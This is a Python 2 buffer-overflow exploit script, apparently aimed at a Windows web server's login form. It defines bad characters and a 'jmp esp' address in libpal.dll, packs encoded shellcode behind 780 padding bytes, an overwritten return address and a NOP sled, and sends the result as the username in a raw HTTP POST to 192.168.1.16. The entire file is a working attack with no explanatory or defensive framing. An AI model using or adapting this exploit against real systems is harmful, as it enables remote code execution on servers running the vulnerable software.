import socket
#"\x00,\x0a,\x0d,\x25,\x26,\x3d" ---> bad char

#\xFF\xe4 ---> jmp esp
#libpal.dll

 #10090C83 --> adress of jmp esp

shell=""
shell+="\xda\xd2\xbf\xf7\x5d\x12\xa6\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
shell+="\x59\x31\x7d\x19\x03\x7d\x19\x83\xed\xfc\x15\xa8\xee\x4e\x56"
shell+="\x53\x0f\x8f\x08\x65\xdd\xeb\x43\xd7\xd1\x7a\xb6\x53\x43\x71"
shell+="\xb3\x36\x70\x02\xb1\x9e\x49\xeb\x3a\x68\xe3\x35\x75\x56\x58"
shell+="\x05\x14\x2a\xa3\x5a\xf6\x13\x6c\xaf\xf7\x54\x3a\xc5\x18\x08"
shell+="\xea\xae\xb4\xbd\x9f\xf3\x04\xbf\x4f\x78\x34\xc7\xea\xbf\xc0"
shell+="\x7b\xf4\xef\x78\x0f\xae\x2f\xf3\x47\x57\x31\xd0\xdd\xae\x45"
shell+="\xea\xec\xcf\xef\x99\x3b\xbb\xf1\x4b\x72\x7b\x5d\xb2\xba\x76"
shell+="\x9f\xf3\x7d\x69\xea\x0f\x7e\x14\xed\xd4\xfc\xc2\x78\xca\xa7"
shell+="\x81\xdb\x2e\x59\x45\xbd\xa5\x55\x22\xc9\xe1\x79\xb5\x1e\x9a"
shell+="\x86\x3e\xa1\x4c\x0f\x04\x86\x48\x4b\xde\xa7\xc9\x31\xb1\xd8"
shell+="\x09\x9d\x6e\x7d\x42\x0c\x78\x01\xab\xce\x85\x5f\x3b\x02\x48"
shell+="\x60\xbb\x0c\xdb\x13\x89\x93\x77\xbc\xa1\x5c\x5e\x3b\xb0\x4b"
shell+="\x61\x93\x7a\x1b\x9f\x14\x7a\x35\x64\x40\x2a\x2d\x4d\xe9\xa1"
shell+="\xad\x72\x3c\x5f\xa4\xe4\x7f\x37\xb9\x76\x17\x45\xba\x77\x53"
shell+="\xc0\x5c\x27\xf3\x82\xf0\x88\xa3\x62\xa1\x60\xae\x6d\x9e\x91"
shell+="\xd1\xa4\xb7\x38\x3e\x10\xef\xd4\xa7\x39\x7b\x44\x27\x94\x01"
shell+="\x46\xa3\x1c\xf5\x09\x44\x55\xe5\x7e\x33\x95\xf5\x7e\xd6\x95"
shell+="\x9f\x7a\x70\xc2\x37\x81\xa5\x24\x98\x7a\x80\x37\xdf\x85\x55"
shell+="\x01\xab\xb0\xc3\x2d\xc3\xbc\x03\xad\x13\xeb\x49\xad\x7b\x4b"
shell+="\x2a\xfe\x9e\x94\xe7\x93\x32\x01\x08\xc5\xe7\x82\x60\xeb\xde"
shell+="\xe5\x2e\x14\x35\x76\x28\xea\xcb\x51\x91\x82\x33\xe2\x21\x52"
shell+="\x5e\xe2\x71\x3a\x95\xcd\x7e\x8a\x56\xc4\xd6\x82\xdd\x89\x95"
shell+="\x33\xe1\x83\x78\xed\xe2\x20\xa1\x1e\x98\x49\x56\xdf\x5d\x40"
shell+="\x33\xe0\x5d\x6c\x45\xdd\x8b\x55\x33\x20\x08\xe2\x4c\x17\x2d"
shell+="\x43\xc7\x57\x61\x93\xc2";





buffer='A'*780+"\x83\x0C\x09\x10"+'\x90'*20 +shell+'\x90'*(1500-780-4-20-len(shell))
	
payload="username="+buffer+ "&password=1234"
requst="POST /login HTTP/1.1\r\n"
requst+="Host: 192.168.1.16\r\n"
requst+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
requst+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
requst+="Accept-Language: en-US,en;q=0.5\r\n"
requst+="Accept-Encoding: gzip, deflate\r\n"
requst+="Content-Type: application/x-www-form-urlencoded\r\n"
requst+="Content-Length: " +str(len(payload))+"\r\n"
requst+="Origin: http://192.168.1.16\r\n"
requst+="DNT: 1\r\n"
requst+="Connection: keep-alive\r\n"
requst+="Referer: http://192.168.1.16/login\r\n"
requst+="Upgrade-Insecure-Requests: 1\r\n"
requst+="\r\n"
requst+= payload
print requst
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.16",80))
s.send(requst)
print s.recv(1024)
s.close()
 